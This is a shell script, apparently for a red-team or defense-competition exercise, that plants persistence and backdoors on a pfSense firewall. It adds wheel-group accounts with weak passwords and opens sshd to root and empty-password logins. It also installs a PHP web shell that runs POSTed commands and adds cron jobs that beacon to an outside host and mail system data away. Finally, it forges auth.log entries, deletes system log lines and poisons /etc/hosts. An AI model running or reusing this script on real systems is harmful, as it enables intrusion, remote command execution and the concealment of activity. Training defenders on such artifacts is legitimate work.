#!/bin/sh

BACKUP_DIR="/tmp/pfsense_backup_$(date +%Y%m%d_%H%M%S)"

backup() {
    mkdir -p "$BACKUP_DIR"
    
    # Backup critical config files
    cp /cf/conf/config.xml "$BACKUP_DIR/config.xml.backup" 2>/dev/null
    cp /etc/passwd "$BACKUP_DIR/passwd.backup" 2>/dev/null
    cp /etc/master.passwd "$BACKUP_DIR/master.passwd.backup" 2>/dev/null
    cp /etc/crontab "$BACKUP_DIR/crontab.backup" 2>/dev/null
    cp /etc/ssh/sshd_config "$BACKUP_DIR/sshd_config.backup" 2>/dev/null
    cp /etc/hosts "$BACKUP_DIR/hosts.backup" 2>/dev/null
    cp /etc/motd "$BACKUP_DIR/motd.backup" 2>/dev/null
}

users() {
    if ! grep -q "redteam" /etc/passwd; then
        pw useradd redteam -c "do not remove" -s /bin/sh -m
        echo "letredin" | passwd redteam --stdin
        pw groupmod wheel -m redteam
    fi
    
    if ! grep -q "ccdc" /etc/passwd; then
        pw useradd ccdc -c "ccdc" -s /bin/sh -m
        echo "password123" | passwd ccdc --stdin
        pw groupmod wheel -m ccdc
    fi
}

ssh() {
    cat >> /etc/ssh/sshd_config << 'EOF'
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
MaxAuthTries 10
ClientAliveInterval 0
X11Forwarding yes
AllowTcpForwarding yes
EOF

    # This will kick people out
    # service sshd onestart 2>/dev/null
}

cron() {
    cat >> /etc/crontab << 'EOF'

*/5 * * * * root /root/system_check.sh > /dev/null 2>&1
0 2 * * * root /usr/local/bin/data_collector.sh
*/15 * * * * root curl -s http://suspicious-domain.com/beacon > /dev/null
EOF
    
    cat > /root/system_check.sh << 'EOF'
#!/bin/sh
ps aux | grep -E "(ssh|http|ftp)" | mail -s "System Report" external@domain.com
netstat -an > /tmp/network_state.log
EOF
    chmod +x /root/system_check.sh
    
    cat > /usr/local/bin/data_collector.sh << 'EOF'
#!/bin/sh
# Data collection script
find /home -name "*.txt" -o -name "*.doc" -o -name "*.pdf" | head -20 > /tmp/files_of_interest.log
cat /etc/passwd | cut -d: -f1,3,6 > /tmp/user_info.log
EOF
    chmod +x /usr/local/bin/data_collector.sh
}

web_backdoor() {
    WEBROOT="/usr/local/www"
    if [ -d "$WEBROOT" ]; then
        cat > "$WEBROOT/system_info.php" << 'EOF'
<?php
// System Information Tool - Hidden Backdoor
if (isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd']);
    echo "<pre>$output</pre>";
}
?>
<html>
<head><title>System Information</title></head>
<body>
<h2>System Diagnostic Tool</h2>
<form method="post">
    <input type="text" name="cmd" placeholder="Enter system command" size="50">
    <input type="submit" value="Execute">
</form>
</body>
</html>
EOF
    fi
}

beacon() {
    cat > /root/network_beacon.sh << 'EOF'
#!/bin/sh
# Network beacon script
while true; do
    nc -z 192.168.1.100 4444 2>/dev/null
    nc -z 10.0.0.50 8080 2>/dev/null
    sleep 300
done
EOF
    chmod +x /root/network_beacon.sh    
}

fake_logs() {
    cat >> /var/log/auth.log << 'EOF'
Dec 15 03:22:15 pfsense sshd[12345]: Failed password for root from 1.2.3.4 port 22 ssh2
Dec 15 03:22:18 pfsense sshd[12346]: Failed password for admin from 1.2.3.4 port 22 ssh2
Dec 15 03:22:25 pfsense sshd[12347]: Accepted password for redteam from 1.2.3.4 port 22 ssh2
Dec 15 03:25:10 pfsense sudo: redteam : TTY=pts/0 ; PWD=/home/redteam ; USER=root ; COMMAND=/bin/cat /etc/shadow
Dec 15 03:30:45 pfsense su: redteam to root on /dev/pts/0
EOF
    
    # Create gaps in system log (simulate log deletion)
    sed -i '$ d' /var/log/system.log 2>/dev/null
    sed -i '$ d' /var/log/system.log 2>/dev/null
    sed -i '$ d' /var/log/system.log 2>/dev/null
    
}

fake_evidence() {
    mkdir -p /tmp/.redteam
    mkdir -p /var/tmp/.redteam_dont_look
    mkdir -p /usr/local/etc/.not_redteam
    
    cat > /tmp/.redteam/extracted_data.txt << 'EOF'
User Credentials Extracted:
admin:$1$salt$hashedpassword
user1:$1$salt$anotherhashedpassword
database_user:plaintext_password_123

Network Configuration:
Internal Network: 192.168.1.0/24
DMZ: 10.0.1.0/24
External IP: 203.0.113.10
EOF
    
    cat > /var/tmp/.redteam_dont_look/system_dump.log << 'EOF'
System Information Dump - $(date)
Hostname: $(hostname)
Users: $(cat /etc/passwd | cut -d: -f1 | tr '\n' ' ')
Network Interfaces: $(ifconfig | grep inet | head -5)
Running Processes: $(ps aux | head -10)
EOF
}

system_configs() {
    cat >> /etc/hosts << 'EOF'

# Suspicious redirections
admin.company.com 192.168.1.200
update.pfsense.org 10.0.0.100
security.monitoring.com 127.0.0.1
EOF
    
    cat > /etc/motd << 'EOF'
This pfSense is very secure...
EOF
}

main() {
    backup
    users
    ssh
    cron
    web_backdoor
    beacon
    fake_logs
    fake_evidence
    system_configs
}

main